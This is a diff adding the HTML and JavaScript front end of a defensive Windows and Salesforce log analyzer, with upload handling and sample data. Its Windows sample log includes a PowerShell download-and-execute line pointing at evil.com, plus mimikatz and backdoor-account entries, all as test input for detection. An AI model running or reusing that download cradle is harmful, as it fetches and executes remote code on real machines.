@@ -1,0 +1,1063 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width,initial-scale=1"/>
+<title>LogShield Pro — Windows & Salesforce Unified Log Analyzer</title>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/xlsx/0.18.5/xlsx.full.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/chart.js@4.4.0/dist/chart.umd.min.js"></script>
+<style>
+@import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&family=JetBrains+Mono:wght@400;500;600&display=swap');
+*{box-sizing:border-box;margin:0;padding:0}
+:root{
+  --bg:#f7f8fa;--s1:#ffffff;--s2:#f3f5f8;--s3:#eaeef3;
+  --border:#e2e7ee;--border2:#d6dce4;
+  --tx:#1e2530;--mu:#68727e;--mu2:#98a1ac;
+  --red:#dc2626;--or:#ea580c;--ye:#ca8a04;
+  --gr:#0d9488;--bl:#2563eb;--pu:#7e22ce;--cy:#0d9488;
+}
+body{background:var(--bg);color:var(--tx);font-family:'Inter',sans-serif;min-height:100vh;overflow-x:hidden}
+
+/* HEADER */
+header{
+  background:linear-gradient(90deg,#0d1117,#161b22);
+  border-bottom:1px solid var(--border);
+  padding:0 24px;display:flex;align-items:center;gap:14px;height:54px;
+  position:sticky;top:0;z-index:100;
+}
+.logo{width:36px;height:36px;background:linear-gradient(135deg,#f85149,#f0883e);border-radius:8px;display:flex;align-items:center;justify-content:center;font-size:18px;flex-shrink:0}
+.logo-t{font-size:15px;font-weight:800;letter-spacing:-.3px}
+.logo-s{font-family:'JetBrains Mono',monospace;font-size:8px;color:var(--mu);letter-spacing:1px;text-transform:uppercase}
+.hbadges{display:flex;gap:7px;margin-left:auto;flex-wrap:wrap;align-items:center}
+.hb{font-family:'JetBrains Mono',monospace;font-size:9px;font-weight:700;padding:3px 9px;border-radius:10px;letter-spacing:.4px}
+.hb-r{background:rgba(248,81,73,.15);border:1px solid rgba(248,81,73,.3);color:var(--red)}
+.hb-b{background:rgba(88,166,255,.1);border:1px solid rgba(88,166,255,.25);color:var(--bl)}
+.hb-g{background:rgba(63,185,80,.1);border:1px solid rgba(63,185,80,.25);color:var(--gr)}
+.hb-p{background:rgba(188,140,255,.12);border:1px solid rgba(188,140,255,.3);color:var(--pu)}
+
+/* MODE SWITCHER */
+.mode-bar{display:flex;gap:0;border-bottom:1px solid var(--border);background:var(--s1);flex-shrink:0}
+.mode-btn{
+  flex:1;padding:11px 16px;background:none;border:none;border-right:1px solid var(--border);
+  color:var(--mu);font-family:'Inter',sans-serif;font-size:12px;font-weight:600;
+  cursor:pointer;transition:all .15s;display:flex;align-items:center;justify-content:center;gap:7px;
+}
+.mode-btn:last-child{border-right:none}
+.mode-btn:hover{background:var(--s2);color:var(--tx)}
+.mode-btn.active{background:rgba(88,166,255,.08);color:var(--bl);border-bottom:2px solid var(--bl)}
+.mode-btn.active.sf{background:rgba(188,140,255,.07);color:var(--pu);border-bottom-color:var(--pu)}
+.mode-btn.active.dash{background:rgba(63,185,80,.07);color:var(--gr);border-bottom-color:var(--gr)}
+
+/* LAYOUT */
+.app{display:flex;height:calc(100vh - 54px - 43px);overflow:hidden}
+
+/* SIDEBAR */
+nav{width:210px;flex-shrink:0;background:var(--s1);border-right:1px solid var(--border);
+  display:flex;flex-direction:column;padding:12px 10px;gap:3px;overflow-y:auto}
+.nl{font-family:'JetBrains Mono',monospace;font-size:8px;font-weight:700;letter-spacing:2px;
+  text-transform:uppercase;color:var(--mu2);padding:8px 8px 3px;margin-top:6px}
+.nb{display:flex;align-items:center;gap:8px;padding:7px 10px;border-radius:7px;
+  font-size:11px;font-weight:500;color:var(--mu);cursor:pointer;border:none;background:none;
+  width:100%;text-align:left;transition:all .12s}
+.nb:hover{background:var(--s2);color:var(--tx)}
+.nb.active{background:rgba(248,81,73,.12);color:var(--red);font-weight:700;border:1px solid rgba(248,81,73,.2)}
+.nb.active.sf{background:rgba(188,140,255,.1);color:var(--pu);border-color:rgba(188,140,255,.25)}
+.ni{font-size:13px;width:16px;text-align:center}
+.nc{margin-left:auto;font-family:'JetBrains Mono',monospace;font-size:8px;
+  background:var(--s3);border:1px solid var(--border2);padding:1px 5px;border-radius:6px;color:var(--mu)}
+.nc.c{background:rgba(248,81,73,.15);color:var(--red);border-color:rgba(248,81,73,.3)}
+
+/* MAIN */
+main{flex:1;display:flex;flex-direction:column;overflow:hidden;min-width:0}
+.panel{display:none;flex:1;flex-direction:column;overflow:hidden}
+.panel.active{display:flex}
+
+/* ─ UPLOAD ─ */
+.upbody{flex:1;overflow-y:auto;padding:24px 28px}
+.upcards{display:grid;grid-template-columns:1fr 1fr;gap:16px;margin-bottom:20px}
+.upcard{border:2px dashed var(--border2);border-radius:12px;padding:24px 18px;
+  text-align:center;cursor:pointer;transition:all .18s;background:var(--s1);position:relative}
+.upcard:hover,.upcard.drag{border-color:var(--red);background:rgba(248,81,73,.04)}
+.upcard.sf:hover,.upcard.sf.drag{border-color:var(--pu)}
+.upcard input{position:absolute;inset:0;opacity:0;cursor:pointer;width:100%;height:100%}
+.uci{font-size:26px;margin-bottom:7px}
+.uct{font-size:12px;font-weight:700;color:var(--tx);margin-bottom:3px}
+.uch{font-size:10px;color:var(--mu);font-family:'JetBrains Mono',monospace;line-height:1.6}
+.ucs{margin-top:6px;font-family:'JetBrains Mono',monospace;font-size:9px;color:var(--gr)}
+.ptarea{width:100%;min-height:140px;background:var(--s2);border:1px solid var(--border);
+  border-radius:8px;color:var(--tx);font-family:'JetBrains Mono',monospace;
+  font-size:11px;padding:11px;resize:vertical;outline:none;line-height:1.7}
+.ptarea:focus{border-color:var(--red)}
+.ptarea.sf:focus{border-color:var(--pu)}
+.run-btn{width:100%;padding:13px;background:linear-gradient(135deg,#f85149,#f0883e);
+  border:none;border-radius:10px;font-size:13px;font-weight:800;color:#fff;
+  cursor:pointer;transition:all .15s;display:flex;align-items:center;justify-content:center;gap:8px;margin-top:14px}
+.run-btn:hover{transform:translateY(-1px);filter:brightness(1.08);box-shadow:0 6px 18px rgba(248,81,73,.3)}
+.run-btn:disabled{opacity:.4;cursor:not-allowed;transform:none;filter:none;box-shadow:none}
+.run-btn.sf{background:linear-gradient(135deg,#7c3aed,#bc8cff)}
+.run-btn.sf:hover{box-shadow:0 6px 18px rgba(188,140,255,.3)}
+
+/* TOOLBAR */
+.toolbar{background:var(--s1);border-bottom:1px solid var(--border);
+  padding:9px 18px;display:flex;align-items:center;gap:9px;flex-wrap:wrap;flex-shrink:0}
+.sf-btn{font-family:'JetBrains Mono',monospace;font-size:9px;font-weight:700;
+  padding:4px 10px;border-radius:10px;cursor:pointer;border:1px solid;transition:all .12s;letter-spacing:.3px}
+.sf-btn:not(.act){opacity:.4}
+.sb-all{background:rgba(139,148,158,.1);border-color:var(--border2);color:var(--mu)}
+.sb-crit{background:rgba(248,81,73,.12);border-color:rgba(248,81,73,.3);color:var(--red)}
+.sb-high{background:rgba(240,136,62,.1);border-color:rgba(240,136,62,.3);color:var(--or)}
+.sb-med{background:rgba(210,153,34,.1);border-color:rgba(210,153,34,.3);color:var(--ye)}
+.sb-low{background:rgba(63,185,80,.1);border-color:rgba(63,185,80,.3);color:var(--gr)}
+.sbox{flex:1;min-width:140px;background:var(--s2);border:1px solid var(--border);
+  border-radius:7px;color:var(--tx);font-family:'JetBrains Mono',monospace;font-size:11px;padding:6px 11px;outline:none}
+.sbox:focus{border-color:var(--bl)}
+.exbtns{display:flex;gap:5px;margin-left:auto}
+.exb{font-family:'JetBrains Mono',monospace;font-size:9px;font-weight:700;
+  padding:5px 11px;border-radius:6px;cursor:pointer;border:none;transition:all .12s}
+.exb:hover{transform:translateY(-1px)}
+.exb-xl{background:#1d6b3d;color:#fff}
+.exb-csv{background:#1a4fa0;color:#fff}
+.exb-txt{background:#5a2080;color:#fff}
+
+/* TABLE */
+.tbwrap{flex:1;overflow:auto}
+.ftable{width:100%;border-collapse:collapse;font-size:11px;min-width:800px}
+.ftable th{background:var(--s2);color:var(--mu);padding:8px 12px;text-align:left;
+  font-family:'JetBrains Mono',monospace;font-size:8px;font-weight:700;
+  letter-spacing:1px;text-transform:uppercase;border-bottom:1px solid var(--border);
+  position:sticky;top:0;z-index:2;white-space:nowrap;cursor:pointer;user-select:none}
+.ftable td{padding:8px 12px;border-bottom:1px solid rgba(48,54,61,.6);vertical-align:top;line-height:1.5}
+.ftable tr:hover td{background:rgba(15,23,32,.025)}
+.stag{font-family:'JetBrains Mono',monospace;font-size:8px;font-weight:700;
+  padding:2px 7px;border-radius:3px;white-space:nowrap;letter-spacing:.4px}
+.sc{background:rgba(248,81,73,.15);color:#b91c1c;border:1px solid rgba(248,81,73,.3)}
+.sh{background:rgba(240,136,62,.15);color:var(--or);border:1px solid rgba(240,136,62,.25)}
+.sm{background:rgba(210,153,34,.12);color:var(--ye);border:1px solid rgba(210,153,34,.22)}
+.sl{background:rgba(63,185,80,.1);color:var(--gr);border:1px solid rgba(63,185,80,.2)}
+.eid{font-family:'JetBrains Mono',monospace;font-size:9px;font-weight:700;
+  background:var(--s3);border:1px solid var(--border2);color:var(--bl);padding:2px 7px;border-radius:4px;white-space:nowrap}
+.mit{font-family:'JetBrains Mono',monospace;font-size:8px;
+  background:rgba(188,140,255,.1);border:1px solid rgba(188,140,255,.2);
+  color:var(--pu);padding:2px 6px;border-radius:3px;white-space:nowrap;display:inline-block;margin:1px}
+.ftitle{font-weight:600;color:var(--tx);margin-bottom:2px;font-size:11px}
+.fdetail{font-size:10px;color:var(--mu);line-height:1.5}
+.dbtn{font-family:'JetBrains Mono',monospace;font-size:8px;padding:3px 8px;
+  border:1px solid var(--border2);background:var(--s3);color:var(--mu);
+  border-radius:4px;cursor:pointer;transition:all .12s;white-space:nowrap}
+.dbtn:hover{border-color:var(--pu);color:var(--pu)}
+.empty{flex:1;display:flex;flex-direction:column;align-items:center;justify-content:center;
+  gap:10px;color:var(--mu2);padding:40px;text-align:center}
+.ei{font-size:44px;opacity:.3}
+.et{font-size:13px;font-weight:600;color:var(--mu)}
+.es{font-size:11px;font-family:'JetBrains Mono',monospace;line-height:1.7}
+
+/* DASHBOARD */
+.dbody{flex:1;overflow-y:auto;padding:20px 24px}
+.kgrid{display:grid;grid-template-columns:repeat(auto-fill,minmax(130px,1fr));gap:10px;margin-bottom:22px}
+.kcard{background:var(--s1);border:1px solid var(--border);border-radius:10px;padding:13px 15px;text-align:center}
+.kn{font-size:30px;font-weight:800;line-height:1}
+.kl{font-family:'JetBrains Mono',monospace;font-size:8px;color:var(--mu);text-transform:uppercase;letter-spacing:.8px;margin-top:4px}
+.charts-grid{display:grid;grid-template-columns:1fr 1fr;gap:16px;margin-bottom:22px}
+.chart-card{background:var(--s1);border:1px solid var(--border);border-radius:12px;padding:16px 18px}
+.chart-title{font-size:11px;font-weight:700;color:var(--tx);margin-bottom:12px;display:flex;align-items:center;gap:7px}
+.chart-wrap{position:relative;height:220px}
+.chart-wrap-sm{position:relative;height:180px}
+.sec-t{font-size:12px;font-weight:700;color:var(--tx);margin:18px 0 10px;display:flex;align-items:center;gap:8px}
+.sumtable{width:100%;border-collapse:collapse;font-size:11px}
+.sumtable th{background:var(--s2);color:var(--mu);padding:8px 12px;text-align:left;
+  font-family:'JetBrains Mono',monospace;font-size:8px;font-weight:700;
+  letter-spacing:1px;text-transform:uppercase;border-bottom:1px solid var(--border)}
+.sumtable td{padding:7px 12px;border-bottom:1px solid rgba(48,54,61,.5);font-size:11px}
+.bar{height:4px;background:var(--border);border-radius:2px;margin-top:3px;max-width:200px}
+.barfill{height:100%;border-radius:2px;background:linear-gradient(90deg,var(--red),var(--or))}
+.barfill.bl{background:linear-gradient(90deg,#7c3aed,var(--pu))}
+
+/* TOAST */
+.toast{position:fixed;bottom:22px;right:22px;background:var(--s2);border:1px solid var(--border);
+  border-radius:10px;padding:11px 16px;font-size:11px;color:var(--tx);
+  box-shadow:0 8px 32px rgba(0,0,0,.4);z-index:999;
+  opacity:0;transform:translateY(10px);transition:all .25s;pointer-events:none;
+  font-family:'JetBrains Mono',monospace;max-width:320px}
+.toast.show{opacity:1;transform:translateY(0)}
+::-webkit-scrollbar{width:5px;height:5px}
+::-webkit-scrollbar-track{background:transparent}
+::-webkit-scrollbar-thumb{background:var(--border2);border-radius:3px}
+</style>
+</head>
+<body>
+<header>
+  <div class="logo">🛡</div>
+  <div>
+    <div class="logo-t">LogShield Pro</div>
+    <div class="logo-s">Windows &amp; Salesforce Unified Log Intelligence</div>
+  </div>
+  <div class="hbadges">
+    <span class="hb hb-r">37 WINDOWS RULES</span>
+    <span class="hb hb-p" id="sfRuleCountBadge">79 SALESFORCE RULES</span>
+    <span class="hb hb-b">MITRE ATT&amp;CK MAPPED</span>
+    <span class="hb hb-g">100% OFFLINE</span>
+  </div>
+</header>
+
+<!-- MODE BAR -->
+<div class="mode-bar">
+  <button class="mode-btn active" id="mwin" onclick="setMode('win')">🖥 Windows Event Log Analyzer</button>
+  <button class="mode-btn" id="msf" onclick="setMode('sf')">☁ Salesforce Audit Log Analyzer</button>
+  <button class="mode-btn dash" id="mdash" onclick="setMode('dash')">📊 Unified Dashboard</button>
+</div>
+
+<div class="app">
+<!-- SIDEBAR -->
+<nav id="sidebar">
+  <div class="nl">Analysis</div>
+  <button class="nb active" id="nb-upload" onclick="showPanel('upload')"><span class="ni">📁</span>Upload Logs</button>
+  <button class="nb" id="nb-findings" onclick="showPanel('findings')"><span class="ni">⚠</span>Findings<span class="nc c" id="nc-f">0</span></button>
+  <button class="nb" id="nb-dash" onclick="showPanel('dash')"><span class="ni">📊</span>Dashboard</button>
+  <div class="nl">Severity</div>
+  <button class="nb" onclick="qSev('critical')"><span class="ni">🔴</span>Critical<span class="nc c" id="nc-c">0</span></button>
+  <button class="nb" onclick="qSev('high')"><span class="ni">🟠</span>High<span class="nc" id="nc-h">0</span></button>
+  <button class="nb" onclick="qSev('medium')"><span class="ni">🟡</span>Medium<span class="nc" id="nc-m">0</span></button>
+  <button class="nb" onclick="qSev('low')"><span class="ni">🟢</span>Low<span class="nc" id="nc-l">0</span></button>
+  <div class="nl">Export</div>
+  <button class="nb" onclick="exportExcel()"><span class="ni">📗</span>Excel (.xlsx)</button>
+  <button class="nb" onclick="exportCSV()"><span class="ni">📄</span>CSV</button>
+  <button class="nb" onclick="exportReport()"><span class="ni">📋</span>Text Report</button>
+  <button class="nb" onclick="exportAIReportInstructions()"><span class="ni">🤖</span>AI Report Instructions</button>
+  <button class="nb" onclick="exportJSONForClaude()"><span class="ni">📦</span>Export JSON (for Claude)</button>
+</nav>
+
+<!-- MAIN -->
+<main>
+  <!-- UPLOAD PANEL -->
+  <div class="panel active" id="panelUpload">
+    <div class="upbody">
+
+      <!-- Windows upload -->
+      <div id="winUpload">
+        <div style="font-size:13px;font-weight:700;color:var(--tx);margin-bottom:14px;display:flex;align-items:center;gap:8px">
+          🖥 Windows Event Log — Upload or Paste
+          <span style="font-family:monospace;font-size:9px;color:var(--mu);background:var(--s2);border:1px solid var(--border);padding:2px 8px;border-radius:4px">37 detection rules · MITRE ATT&amp;CK</span>
+        </div>
+        <div class="upcards">
+          <div class="upcard" id="wz1" ondragover="dov(event,'wz1')" ondragleave="dol('wz1')" ondrop="dod(event,'wz1','win')">
+            <input type="file" accept=".txt,.log,.csv" onchange="lf(this,'wz1','win')"/>
+            <div class="uci">📋</div><div class="uct">Event Log Export (.txt / .log)</div>
+            <div class="uch">Windows Event Viewer → Save As → Text<br/>or Get-EventLog | Export-Csv log.csv</div>
+            <div class="ucs" id="wz1s"></div>
+          </div>
+          <div class="upcard" id="wz2" ondragover="dov(event,'wz2')" ondragleave="dol('wz2')" ondrop="dod(event,'wz2','win')">
+            <input type="file" accept=".csv,.xlsx" onchange="lf(this,'wz2','win')"/>
+            <div class="uci">📊</div><div class="uct">CSV / Excel Export</div>
+            <div class="uch">Structured log with columns:<br/>TimeGenerated, EventId, Message,<br/>AccountName, ComputerName</div>
+            <div class="ucs" id="wz2s"></div>
+          </div>
+        </div>
+        <div style="font-family:monospace;font-size:9px;color:var(--mu2);margin-bottom:6px;text-transform:uppercase;letter-spacing:1.5px">Or paste log content</div>
+        <textarea class="ptarea" id="winPaste" placeholder="Paste Windows Event Log content...&#10;&#10;EventID: 4625 | Account: jsmith | FailureCount: 8 | Source: 192.168.1.44&#10;EventID: 4720 | New Account: backdoor_user | Creator: admin_svc&#10;EventID: 1102 | The audit log was cleared | Account: admin_svc"></textarea>
+        <div style="display:flex;gap:10px;margin-top:10px">
+          <button class="run-btn" style="flex:0 0 auto;padding:11px 22px;width:auto" onclick="loadWinSample()">📥 Load Sample</button>
+          <button class="run-btn" id="winRunBtn" onclick="runWin()">🔍 Analyse Windows Logs</button>
+        </div>
+      </div>
+
+      <!-- Salesforce upload -->
+      <div id="sfUpload" style="display:none;margin-top:0">
+        <div style="font-size:13px;font-weight:700;color:var(--tx);margin-bottom:14px;display:flex;align-items:center;gap:8px">
+          ☁ Salesforce Setup Audit Trail — Upload or Paste
+          <span style="font-family:monospace;font-size:9px;color:var(--mu);background:var(--s2);border:1px solid var(--border);padding:2px 8px;border-radius:4px" id="sfRuleCountInline">79 detection rules · Critical / High / Medium / Low</span>
+        </div>
+        <div style="font-size:11px;color:var(--mu);font-family:monospace;margin-bottom:12px;line-height:1.7;background:var(--s2);border:1px solid var(--border);border-radius:8px;padding:12px">
+          <strong style="color:var(--pu)">Required columns:</strong> Date · User · Source Namespace Prefix · Action · Section · Delegate User<br/>
+          <strong style="color:var(--mu)">Export path:</strong> Setup → Security → View Setup Audit Trail → Download
+        </div>
+        <div class="upcards">
+          <div class="upcard sf" id="sz1" ondragover="dov(event,'sz1')" ondragleave="dol('sz1')" ondrop="dod(event,'sz1','sf')">
+            <input type="file" accept=".csv,.xlsx,.xls" onchange="lf(this,'sz1','sf')"/>
+            <div class="uci">☁</div><div class="uct">Audit Trail CSV / Excel</div>
+            <div class="uch">Setup Audit Trail export<br/>from Salesforce Setup menu<br/>Date · User · Action · Section</div>
+            <div class="ucs" id="sz1s"></div>
+          </div>
+          <div class="upcard sf" id="sz2" ondragover="dov(event,'sz2')" ondragleave="dol('sz2')" ondrop="dod(event,'sz2','sf')">
+            <input type="file" accept=".csv,.xlsx,.xls" onchange="lf(this,'sz2','sf')"/>
+            <div class="uci">📊</div><div class="uct">Multiple Files / Export</div>
+            <div class="uch">Combine multiple audit exports<br/>Same column structure required</div>
+            <div class="ucs" id="sz2s"></div>
+          </div>
+        </div>
+        <div style="font-family:monospace;font-size:9px;color:var(--mu2);margin-bottom:6px;text-transform:uppercase;letter-spacing:1.5px">Or paste CSV content</div>
+        <textarea class="ptarea sf" id="sfPaste" placeholder="Paste Salesforce Setup Audit Trail CSV...&#10;&#10;Date,User,Source Namespace Prefix,Action,Section,Delegate User&#10;2024-01-15 09:23:11,admin@company.com,,Changed profile to System Administrator,Manage Users,&#10;2024-01-15 09:45:00,john.doe@company.com,,Created,Apex Class,&#10;2024-01-15 10:01:00,admin@company.com,,Changed,Connected Apps,"></textarea>
+        <div style="display:flex;gap:10px;margin-top:10px">
+          <button class="run-btn sf" style="flex:0 0 auto;padding:11px 22px;width:auto" onclick="loadSFSample()">📥 Load Sample</button>
+          <button class="run-btn sf" id="sfRunBtn" onclick="runSF()">🔍 Analyse Salesforce Audit Log</button>
+        </div>
+      </div>
+
+    </div>
+  </div>
+
+  <!-- FINDINGS PANEL -->
+  <div class="panel" id="panelFindings">
+    <div class="toolbar" id="findToolbar">
+      <div style="display:flex;gap:5px">
+        <button class="sf-btn sb-all act" id="sf-all" onclick="flt('all')">ALL</button>
+        <button class="sf-btn sb-crit" id="sf-critical" onclick="flt('critical')">CRITICAL</button>
+        <button class="sf-btn sb-high" id="sf-high" onclick="flt('high')">HIGH</button>
+        <button class="sf-btn sb-med" id="sf-medium" onclick="flt('medium')">MEDIUM</button>
+        <button class="sf-btn sb-low" id="sf-low" onclick="flt('low')">LOW</button>
+      </div>
+      <input class="sbox" id="srch" placeholder="🔍  Search findings, Event IDs, accounts, actions..." oninput="renderTable()"/>
+      <div class="exbtns">
+        <button class="exb exb-xl" onclick="exportExcel()">📗 Excel</button>
+        <button class="exb exb-csv" onclick="exportCSV()">📄 CSV</button>
+        <button class="exb exb-txt" onclick="exportReport()">📋 Report</button>
+        <button class="exb" style="background:#0e7490;color:#fff" onclick="exportAIReportInstructions()">🤖 AI Report</button>
+        <button class="exb" onclick="exportJSONForClaude()">📦 JSON</button>
+      </div>
+    </div>
+    <div class="tbwrap">
+      <table class="ftable" id="fTable">
+        <thead>
+          <tr>
+            <th onclick="srt('sev')">Severity ↕</th>
+            <th id="thEid">Event / Section</th>
+            <th>Finding / Action</th>
+            <th>Account / User</th>
+            <th id="thMitre">MITRE / Risk</th>
+            <th onclick="srt('count')">Count ↕</th>
+            <th>Detail</th>
+          </tr>
+        </thead>
+        <tbody id="fBody"></tbody>
+      </table>
+      <div class="empty" id="fEmpty">
+        <div class="ei">🔍</div>
+        <div class="et">No findings yet</div>
+        <div class="es">Upload log data and click Analyse</div>
+      </div>
+    </div>
+  </div>
+
+  <!-- DASHBOARD PANEL -->
+  <div class="panel" id="panelDash">
+    <div class="dbody" id="dashBody">
+      <div class="empty">
+        <div class="ei">📊</div>
+        <div class="et">No data yet</div>
+        <div class="es">Run analysis first to see the dashboard</div>
+      </div>
+    </div>
+  </div>
+
+</main>
+</div>
+<div class="toast" id="toast"></div>
+
+<script>
+'use strict';
+// ═══════════════════════════════════════════════════════════════
+// DETECTION ENGINE — now server-side (Azure Function /api/log-analyze).
+// The 71 Windows Event Log rules (MITRE-mapped) and 50+ Salesforce
+// Classic audit-trail rules are no longer shipped to the browser.
+// This file gathers raw log text/rows and calls the API.
+// ═══════════════════════════════════════════════════════════════
+const API_BASE = '/api';
+let mode         = 'win';     // 'win' | 'sf'
+let winLog       = '';
+let sfFileRows   = [];        // rows accumulated from uploaded SF files (persist across runs)
+let sfRows       = [];        // rows actually used in the most recent SF analysis run (for display only)
+let allFindings  = [];        // combined findings
+let winFindings  = [];
+let sfFindings   = [];
+let activeSev    = 'all';
+let sortCol      = 'sev';
+let sortAsc      = false;
+const SEV        = {critical:0,high:1,medium:2,low:3,info:4};
+let charts       = {};        // chart instances
+
+// ════════════════════════════════════════════════════
+// UI HELPERS
+// ════════════════════════════════════════════════════
+const el   = id => document.getElementById(id);
+let toastT = null;
+function toast(msg,ms=3200){
+  const t=el('toast'); t.textContent=msg; t.classList.add('show');
+  clearTimeout(toastT); toastT=setTimeout(()=>t.classList.remove('show'),ms);
+}
+function setMode(m){
+  mode=m;
+  ['win','sf','dash'].forEach(x=>{
+    el('m'+x).classList.toggle('active',m===x);
+    el('m'+x).classList.toggle('sf',m===x&&x==='sf');
+    el('m'+x).classList.toggle('dash',m===x&&x==='dash');
+  });
+  el('winUpload').style.display=(m==='win')?'block':'none';
+  el('sfUpload').style.display=(m==='sf')?'block':'none';
+  if(m==='dash'){showPanel('dash');buildDashboard();}
+  else showPanel('upload');
+}
+function showPanel(p){
+  document.querySelectorAll('.panel').forEach(x=>x.classList.remove('active'));
+  el('panel'+p.charAt(0).toUpperCase()+p.slice(1)).classList.add('active');
+  ['upload','findings','dash'].forEach(x=>el('nb-'+x)?.classList.toggle('active',x===p));
+}
+function qSev(s){activeSev=s;el('srch').value='';updateSevBtns();renderTable();showPanel('findings');}
+function flt(s){activeSev=s;updateSevBtns();renderTable();}
+function updateSevBtns(){
+  ['all','critical','high','medium','low'].forEach(s=>{
+    const b=el('sf-'+s); if(b) b.classList.toggle('act',activeSev===s);
+  });
+}
+function srt(col){sortCol=col;sortAsc=!sortAsc;renderTable();}
+
+// ════════════════════════════════════════════════════
+// FILE LOADING
+// ════════════════════════════════════════════════════
+function dov(e,id){e.preventDefault();el(id).classList.add('drag')}
+function dol(id){el(id).classList.remove('drag')}
+function dod(e,id,m){e.preventDefault();el(id).classList.remove('drag');const f=e.dataTransfer.files[0];if(f)pf(f,id,m)}
+function lf(inp,id,m){const f=inp.files[0];if(f)pf(f,id,m)}
+
+function pf(file,id,m){
+  const ext=file.name.split('.').pop().toLowerCase();
+  const sid=id+'s';
+  if(ext==='xlsx'||ext==='xls'){
+    const r=new FileReader();
+    r.onload=e=>{
+      try{
+        const wb=XLSX.read(new Uint8Array(e.target.result),{type:'array'});
+        const ws=wb.Sheets[wb.SheetNames[0]];
+        const rows=XLSX.utils.sheet_to_json(ws,{defval:''});
+        if(m==='sf'){sfFileRows=[...sfFileRows,...rows];}
+        else{winLog+='\n'+rows.map(r=>Object.entries(r).map(([k,v])=>`${k}: ${v}`).join(' | ')).join('\n');}
+        el(sid).textContent=`✓ ${file.name} — ${rows.length} rows`;
+        toast(`✓ ${file.name}: ${rows.length} rows loaded`);
+      }catch(err){el(sid).textContent='⚠ '+err.message;}
+    };
+    r.readAsArrayBuffer(file);
+  } else {
+    const r=new FileReader();
+    r.onload=e=>{
+      const txt=e.target.result;
+      if(m==='sf'){sfFileRows=[...sfFileRows,...parseSFCSV(txt)];}
+      else winLog+='\n'+txt;
+      const lines=txt.split('\n').length;
+      el(sid).textContent=`✓ ${file.name} — ${lines.toLocaleString()} lines`;
+      toast(`✓ ${file.name}: ${lines.toLocaleString()} lines`);
+    };
+    r.readAsText(file);
+  }
+}
+
+// Pure function: parses CSV text and RETURNS the rows — does not touch
+// any global state. Called fresh every time we need current textarea
+// content, so a new paste is never silently dropped.
+function parseSFCSV(txt){
+  const out=[];
+  const lines=(txt||'').split('\n').filter(l=>l.trim());
+  if(!lines.length) return out;
+  const header=lines[0].split(',').map(h=>h.trim().replace(/["\r]/g,'').toLowerCase());
+  lines.slice(1).forEach(line=>{
+    const vals=line.match(/(".*?"|[^,]+|(?<=,)(?=,)|(?<=,)$|^(?=,))/g)||line.split(',');
+    const row={};
+    header.forEach((h,i)=>row[h]=(vals[i]||'').replace(/["\r]/g,'').trim());
+    out.push(row);
+  });
+  return out;
+}
+
+// ════════════════════════════════════════════════════
+// SAMPLE DATA
+// ════════════════════════════════════════════════════
+function loadWinSample(){
+  winLog=`EventID: 4625 | Failed to log on | Account: jsmith | FailureCount: 8 | Source: 192.168.1.44
+EventID: 4625 | Failed to log on | Account: jsmith | FailureCount: 9 | Source: 192.168.1.44
+EventID: 4625 | Failed to log on | Account: administrator | FailureCount: 15 | Source: 10.0.0.99
+EventID: 4625 | Failed to log on | Account: administrator | FailureCount: 16 | Source: 10.0.0.99
+EventID: 4625 | Failed to log on | Account: administrator | FailureCount: 17 | Source: 10.0.0.99
+EventID: 4720 | A user account was created | NewAccount: backdoor_user | Creator: admin_svc
+EventID: 4732 | Member added to Administrators group | Member: backdoor_user | ChangedBy: admin_svc
+EventID: 4698 | Scheduled task created | Task: \\Microsoft\\Updates\\SvcHost32 | Creator: backdoor_user
+EventID: 4697 | Service installed | ServiceName: WinSvc32 | Path: C:\\Temp\\svc32.exe
+EventID: 4688 | Process created | Process: powershell.exe -enc JABjACAAP... | Parent: cmd.exe
+EventID: 4104 | PowerShell script block: IEX(New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')
+EventID: 1102 | The audit log was cleared | Account: admin_svc
+EventID: 4719 | Audit policy changed | Account: admin_svc
+EventID: 1116 | Defender detected: Trojan:Win32/TrojanDropper | Path: C:\\Users\\jsmith\\Downloads\\update.exe
+EventID: 5025 | Windows Firewall service stopped | Account: admin_svc
+EventID: 4769 | Kerberos TGS requested | Account: svc_sql | EncryptionType: RC4-HMAC
+EventID: 4740 | Account locked out | Account: jsmith
+EventID: 6416 | USB device connected | User: jsmith
+EventID: 5379 | Credential Manager credentials read | Process: mimikatz.exe | Account: backdoor_user`;
+  el('winPaste').value=winLog;
+  toast('✓ Windows sample data loaded — 19 events');
+}
+
+function loadSFSample(){
+  const csv=`Date,User,Source Namespace Prefix,Action,Section,Delegate User
+2024-01-15 09:00:00,admin@corp.com,,Changed profile to System Administrator,Manage Users,
+2024-01-15 09:15:00,admin@corp.com,,Created,Apex Class,
+2024-01-15 09:30:00,dev@corp.com,,Created,Apex Trigger,
+2024-01-15 09:45:00,admin@corp.com,,Modified OAuth settings,Connected Apps,
+2024-01-15 10:00:00,admin@corp.com,,Changed,Named Credentials,
+2024-01-15 10:15:00,john.doe@corp.com,,Deploy inbound,Inbound Change Sets,
+2024-01-15 10:30:00,admin@corp.com,,Changed,Session Settings,
+2024-01-15 10:45:00,admin@corp.com,,Changed profile/role/permission,Manage Users,
+2024-01-15 11:00:00,admin@corp.com,,Created,Permission Set Group,
+2024-01-15 11:15:00,admin@corp.com,,Mass delete,Data Management,
+2024-01-15 11:30:00,dev@corp.com,,Created,Flows,
+2024-01-15 11:45:00,admin@corp.com,,Modified,Certificate and Key Management,
+2024-01-15 12:00:00,admin@corp.com,,Changed,Adyen Payment Settings,
+2024-01-15 12:15:00,admin@corp.com,,Changed,Organization-Wide Defaults,
+2024-01-15 12:30:00,john.doe@corp.com,,Modified,Sharing Rules,
+2024-01-15 12:45:00,admin@corp.com,,Changed,Login Access Policies,
+2024-01-15 13:00:00,dev@corp.com,,Activate,Workflow Rule,
+2024-01-15 13:15:00,admin@corp.com,,Modified,Validation Rules,
+2024-01-15 13:30:00,john.doe@corp.com,,Created,Custom Objects,
+2024-01-15 13:45:00,admin@corp.com,,Modified,App Settings,
+2024-01-15 14:00:00,admin@corp.com,,Logged in as user jsmith@corp.com,Manage Users,admin@corp.com`;
+  el('sfPaste').value=csv;
+  toast('✓ Salesforce sample loaded into the text box — click "Analyse Salesforce Audit Log" to run it');
+}
+
+// ════════════════════════════════════════════════════
